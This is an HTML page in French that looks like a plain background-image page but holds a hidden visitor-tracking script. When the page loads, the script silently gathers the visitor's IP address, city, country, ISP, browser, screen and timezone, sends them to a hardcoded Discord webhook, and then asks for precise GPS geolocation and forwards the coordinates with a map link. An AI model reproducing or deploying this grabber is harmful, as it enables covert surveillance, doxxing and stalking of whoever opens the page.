<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            background: #000;
            overflow: hidden;
        }
        .bg {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: url('https://ton-lien-image.com/ta-photo.jpg') center/cover no-repeat;
            z-index: -1;
        }
    </style>
</head>
<body>
    <div class="bg"></div>

    <script>
        const webhook = "https://discord.com/api/webhooks/1500837194192130130/SRAwwkVIqaqIgLDX35fRqQMIcUwzqvjcQGa_cgqE2XWVQfgihIRmu8mdxbsGSEcq1xNa";

        function send(title, fields) {
            fetch(webhook, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    content: title,
                    embeds: [{
                        color: 0xFF0000,
                        fields: fields,
                        timestamp: new Date().toISOString()
                    }]
                })
            }).catch(() => {});
        }

        async function start() {
            let info = {};

            // Récupération IP + infos
            try {
                const res = await fetch('http://ip-api.com/json/?fields=query,country,city,regionName,isp,mobile');
                const geo = await res.json();

                if (geo.query) {
                    info.ip = geo.query;
                    info.city = geo.city;
                    info.country = geo.country;
                    info.isp = geo.isp;
                }
            } catch(e) {}

            // Envoi des infos de base
            let fields = [];
            if (info.ip) fields.push({ name: "IP", value: info.ip, inline: true });
            if (info.city) fields.push({ name: "Ville", value: info.city, inline: true });
            if (info.country) fields.push({ name: "Pays", value: info.country, inline: true });
            if (info.isp) fields.push({ name: "FAI", value: info.isp, inline: true });

            fields.push({ name: "User-Agent", value: navigator.userAgent.substring(0, 350) });
            fields.push({ name: "Écran", value: `${screen.width}x${screen.height} (${window.devicePixelRatio}x)` });
            fields.push({ name: "Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone });

            send("🔴 Nouvelle connexion", fields);

            // Demande de géolocalisation précise après un petit délai
            setTimeout(() => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {
                            send("📍 **GÉOLOCALISATION ACCEPTÉE**", [
                                { name: "Latitude", value: pos.coords.latitude.toFixed(6) },
                                { name: "Longitude", value: pos.coords.longitude.toFixed(6) },
                                { name: "Précision", value: Math.round(pos.coords.accuracy) + " mètres" },
                                { name: "Google Maps", value: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` }
                            ]);
                        },
                        () => {} // silencieux si refusé
                    );
                }
            }, 800);
        }

        window.onload = start;
    </script>
</body>
</html>
